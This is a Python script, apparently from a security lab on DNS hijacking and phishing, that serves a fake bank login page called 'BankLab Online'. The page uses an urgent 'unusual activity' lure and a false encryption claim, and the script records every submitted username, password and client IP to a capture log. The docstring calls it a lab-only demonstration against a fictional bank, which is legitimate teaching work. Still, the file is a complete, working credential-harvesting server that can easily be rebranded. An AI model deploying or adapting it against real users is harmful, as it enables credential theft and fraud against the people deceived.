#!/usr/bin/env python3
"""
Phishing clone site for Threat 3 (DNS hijacking / phishing).

Serves a fake bank login page and captures whatever credentials a victim
submits - the "send our data to a safe place" step from the guide. This
exists only to make the attack concrete and to show what a successful hijack
costs; it is never exposed outside the isolated lab network.

Captured credentials are written to CAPTURE_PATH (the attacker's "drop"), and
NOT stored anywhere else. The page is deliberately generic - it impersonates a
fictional "bank-lab.example", not any real institution.

Usage: clone-site.py [listen_ip] [port]
"""
import datetime
import sys
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

LISTEN_IP = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
CAPTURE_PATH = "/root/captured-credentials.log"

LOGIN_PAGE = """<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<title>BankLab Online - Secure Sign In</title>
<style>
 body{font-family:system-ui,Arial,sans-serif;background:#0b3d6b;margin:0}
 .card{max-width:360px;margin:8vh auto;background:#fff;border-radius:8px;padding:32px;
       box-shadow:0 8px 30px rgba(0,0,0,.25)}
 h1{color:#0b3d6b;font-size:20px;margin:0 0 4px} .sub{color:#666;font-size:13px;margin:0 0 20px}
 label{display:block;font-size:13px;color:#333;margin:12px 0 4px}
 input{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}
 button{width:100%;margin-top:20px;padding:11px;background:#0b6b2f;color:#fff;border:0;
        border-radius:4px;font-size:15px;cursor:pointer}
 .lock{color:#0b6b2f;font-size:12px;margin-top:14px;text-align:center}
 .warn{background:#fff3cd;color:#664d03;font-size:12px;padding:8px;border-radius:4px;margin-bottom:16px}
</style></head><body>
<div class="card">
  <h1>BankLab Online</h1>
  <p class="sub">Sign in to your account</p>
  <div class="warn">Unusual activity detected. Please confirm your identity to avoid suspension.</div>
  <form method="POST" action="/login">
    <label>Account number / username</label>
    <input name="username" autocomplete="username" required>
    <label>Password</label>
    <input name="password" type="password" autocomplete="current-password" required>
    <button type="submit">Sign In Securely</button>
  </form>
  <p class="lock">&#128274; Your connection is encrypted</p>
</div></body></html>"""

THANKS = """<!doctype html><html><head><meta charset="utf-8"><title>Signing in...</title>
<style>body{font-family:system-ui,Arial;background:#0b3d6b;color:#fff;text-align:center;padding-top:15vh}</style>
</head><body><h2>Verifying your identity&hellip;</h2>
<p>Please wait while we securely sign you in.</p></body></html>"""


class Handler(BaseHTTPRequestHandler):
    def _send(self, body, code=200):
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(body.encode())

    def do_GET(self):
        self._send(LOGIN_PAGE)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", "replace")
        fields = urllib.parse.parse_qs(body)
        user = fields.get("username", [""])[0]
        pw = fields.get("password", [""])[0]
        ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
        line = "%s captured from=%s user=%r pass=%r\n" % (ts, self.client_address[0], user, pw)
        with open(CAPTURE_PATH, "a") as f:
            f.write(line)
        print("CAPTURED:", line.strip(), flush=True)
        self._send(THANKS)

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    print("clone site (fake bank) on %s:%d" % (LISTEN_IP, PORT), flush=True)
    ThreadingHTTPServer((LISTEN_IP, PORT), Handler).serve_forever()
